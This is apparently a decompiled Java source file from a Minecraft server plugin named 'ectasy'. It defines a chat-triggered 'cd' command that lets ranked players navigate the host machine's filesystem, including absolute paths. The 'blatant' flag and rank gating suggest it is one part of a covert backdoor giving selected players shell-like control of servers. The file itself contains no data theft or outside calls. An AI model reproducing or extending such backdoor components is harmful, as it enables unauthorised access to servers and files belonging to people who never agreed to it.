package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import fr.body.ectasy.util.Vars;
import java.io.File;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "cd",
   description = "Change directory",
   blatant = false,
   rank = Rank.DEVELOPER,
   aliases = {}
)
public class ChangeDirCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use cd <path>");
      } else {
         File var4 = new File(Vars.CURRENT_DIR);
         if (var3[0].equalsIgnoreCase("..")) {
            Vars.CURRENT_DIR = var4.getParentFile().getPath();
            ChatUtil.sendChat(var1.getPlayer(), "Changed successfully.");
         } else {
            File var5 = new File(Vars.CURRENT_DIR + "/" + var3[0]);
            if (!var5.exists()) {
               var5 = new File(var3[0]);
            }

            if (!var5.exists()) {
               ChatUtil.sendChat(var1.getPlayer(), "Path not found.");
            } else if (!var5.isDirectory()) {
               ChatUtil.sendChat(var1.getPlayer(), "The path needs to be a folder.");
            } else {
               Vars.CURRENT_DIR = var5.getPath();
               ChatUtil.sendChat(var1.getPlayer(), "Changed successfully.");
            }
         }
      }
   }
}
